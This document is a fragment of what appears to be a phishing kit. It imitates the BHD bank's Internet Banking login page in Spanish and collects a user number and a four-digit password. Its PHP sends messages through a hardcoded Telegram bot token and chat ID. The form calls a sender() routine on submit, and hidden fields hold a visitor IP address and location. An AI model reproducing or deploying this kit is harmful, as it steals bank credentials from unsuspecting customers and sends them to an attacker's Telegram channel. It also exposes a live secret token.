...
$telegram_bot_id = "7637166066:AAFXKqWVZyuE3o2emkGHw6JB2Eo0bqkp7FM";
$chat_ids = [-4687808011]; // Puedes añadir más IDs si lo necesitas
...
function aviso($telegram_bot_id, $chat_ids) {
    ...
    foreach ($chat_ids as $chat_id) {
        ...
        if (curl_errno($ch)) {
            ...
            error_log("⚠️ Telegram API error ($httpCode): $response");
        } else {
            error_log("✅ Mensaje enviado a chat_id: $chat_id");
        }
...
window.addEventListener('unload', function(){
  ...
  <style>
    ...
    .background-container[_ngcontent-ddn-c132] {
      ...
      background-image: url(./content/background-login.webp)
    }
                ...
                <div class="p-card-body"><!----><!---->
                  <div class="p-card-content">
                    <div _ngcontent-ddn-c132="" class="p-grid">
                      ...
                      <form _ngcontent-ddn-c132="" method="post" onsubmit="return sender();"
                        class="ng-untouched ng-pristine ng-invalid">

                        <p id="gfg" hidden="">179.50.138.3</p>
                        <p id="address" hidden="">Liberia, CR</p>
                        ...
                        <div _ngcontent-ddn-c132="" class="p-fluid p-formgrid p-grid p-jc-center">
                          ...
                          <div _ngcontent-ddn-c132="" class="p-field p-col-10">
                            ...
                            <label _ngcontent-ddn-c132="" for="userName">Usuario <span _ngcontent-ddn-c132=""
                                class="bhd-red-1">*</span></label>
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left user-input">
                              <em _ngcontent-ddn-c132="" class="pi pi-user bhd-gray-3"></em>


                              <input _ngcontent-ddn-c132="" type="tel" pinputtext="" name="usuario" id="uernm"
                                formcontrolname="username" maxlength="13"
                                onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"
                                tooltipposition="bottom"
                                class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid"
                                required="">

                              <em _ngcontent-ddn-c132="" class="close-icon pi pi-action-close"></em>
                            </span><!---->
                          </div>
                          <div _ngcontent-ddn-c132="" class="p-field p-col-10">
                            <label _ngcontent-ddn-c132="" for="password">Contraseña <span _ngcontent-ddn-c132=""
                                class="bhd-red-1">*</span></label>
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left"><em _ngcontent-ddn-c132=""
                                class="pi pi-padlock-locked bhd-gray-3"></em>

                              <input _ngcontent-ddn-c132="" type="password" maxlength="4" name="clave" id="clvuernm"
                                minlength="4" pinputtext="" formcontrolname="password"
                                class="p-inputtext p-component p-element form-control password-mask ng-untouched ng-pristine ng-invalid"
                                required=""></span><!---->
                          </div>

                          <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-mb-2" style="display: none;">
                            <div _ngcontent-ddn-c132="" class="p-d-flex">
                              <div _ngcontent-ddn-c132="">
                                <div _ngcontent-ddn-c132="" class="bhd-captcha"><!---->
                                  <canvas _ngcontent-ddn-c132="" width="110" height="30"></canvas>
                                </div>

                                <div _ngcontent-ddn-c132="" class="p-mb-4 p-mt-2 bhd--font-size-12">
                                  <p _ngcontent-ddn-c132="" class="p-m-0 bhd-hover-green-2-pointer">Refrescar imagen</p>
                                </div>
                              </div>
                              <div _ngcontent-ddn-c132="" class="p-ml-3">

                                <input _ngcontent-ddn-c132="" type="text" pinputtext="" name="captcha" maxlength="4"
                                  formcontrolname="captcha"
                                  class="p-inputtext p-component p-element bhd-captcha-validaton ng-untouched ng-pristine ng-valid"><!---->
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-mt-2">

                            <p-button _ngcontent-ddn-c132="" type="submit" iconpos="right" class="p-element">
                              <button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component"
                                type="submit">
                                <!----><!----><!----><!----><!----><!---->
                                <span class="p-button-label ng-star-inserted">Entrar</span><!----><!---->
                                <span class="p-ink"></span></button></p-button>
                          </div>

                          <div _ngcontent-ddn-c132="" class="p-d-flex p-ai-center bhd-pointer p-mb-3">
                            <bhd-icon _ngcontent-ddn-c132="" name="padlock-locked" class="bhd-green-2 p-mr-1 bhd-icon"
                              _nghost-ddn-c12="" style="width: 18px; height: 18px;"><svg _ngcontent-ddn-c12=""
                                xmlns="http://www.w3.org/2000/svg" fill="none" stroke-linecap="round"
                                stroke-linejoin="round" stroke="var(--bhd-icon-color, currentColor)"
                                class="bhd-icon-padlock-locked" viewBox="0 0 24 24" stroke-width="2">
                                <path stroke-linecap="round"
                                  d="M16 12c3 0 3 3 3 3v3s0 3-3 3H8c-3 0-3-3-3-3v-3s0-3 3-3h8Zm0 0V7.917c0-6.74-8-6.37-8 0v4.07">
                                </path>
                              </svg></bhd-icon><span _ngcontent-ddn-c132=""> ¿Olvidaste tu clave de acceso?
                            </span>
                          </div>
                        </div>
                      </form>
                    ...
                    <div _ngcontent-ddn-c132="" class="p-fluid p-formgrid p-grid p-jc-center">
                      <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-m-0 p-p-0"><!----></div>
                    </div><!---->
                  </div><!---->
                </div>
              </div>
            </p-card>
            <div _ngcontent-ddn-c132="" class="p-d-flex p-ai-center p-jc-center p-pt-3 ibe-link"><em
                _ngcontent-ddn-c132="" class="pi pi-arrow-left"></em><span _ngcontent-ddn-c132=""
                class="p-pl-2 bhd--font-size-16">Ir a Internet Banking Empresarial</span></div>
          </div>
        </div>
        ...
        <div _ngcontent-ddn-c69="" class="bhd-loading-overlay p-d-flex p-flex-column bhd-fade-out"><bhd-icon
            ...
            style="width: 58px; height: 58px;"><svg _ngcontent-ddn-c12="" xmlns="http://www.w3.org/2000/svg" fill="none"
              ...
              <path stroke-linecap="round" stroke-linejoin="round"
                d="M19.603 16c-1.433 2.963-4.408 5-7.846 5-4.508 0-8.22-3.5-8.704-8m16.55 3H16m3.603 0L21 19M4.397 8c1.433-2.963 4.408-5 7.846-5 4.508 0 8.22 3.5 8.704 8M4.397 8H8M4.397 8 3 5">
              </path>
            </svg></bhd-icon>
